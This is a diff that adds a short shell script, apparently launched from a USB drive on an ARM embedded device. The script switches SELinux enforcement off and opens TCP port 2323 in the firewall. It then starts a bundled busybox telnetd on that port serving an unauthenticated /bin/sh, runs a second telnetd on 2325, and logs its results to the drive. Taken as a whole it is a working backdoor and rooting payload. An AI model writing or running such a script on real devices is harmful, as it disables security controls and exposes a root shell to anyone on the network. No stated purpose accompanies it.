@@ -1,0 +1,15 @@
+mkdir -p /media/sda1/d
+/bin/cat /sys/fs/selinux/enforce > /media/sda1/d/e4.txt 2>&1
+/bin/echo 0 > /sys/fs/selinux/enforce 2>>/media/sda1/d/e4.txt
+/bin/cat /sys/fs/selinux/enforce >> /media/sda1/d/e4.txt 2>&1
+/bin/dmesg 2>/dev/null | /bin/grep -i avc >> /media/sda1/d/e4.txt 2>&1
+/bin/sh -c 'exec 3<>/dev/ptmx && echo pty_ok' >> /media/sda1/d/e4.txt 2>&1
+/usr/sbin/iptables -I INPUT -p tcp --dport 2323 -j ACCEPT
+/bin/cp /media/sda1/busybox-armhf /tmp/busybox
+/bin/chmod +x /tmp/busybox
+/bin/pkill -f telnetd
+/tmp/busybox telnetd -p 2323 -l /bin/sh -f /media/sda1/d/t4.log &
+/tmp/busybox telnetd -p 2325 -l /bin/login &
+/bin/sleep 2
+/usr/bin/timeout 8 /bin/sh -c '(echo id; echo MARK; sleep 2) | /usr/bin/telnet 127.0.0.1 2323' > /media/sda1/d/tl4.txt 2>&1
+/bin/netstat -ltn | /bin/grep -E "2323|2325" > /media/sda1/d/net4.txt 2>&1
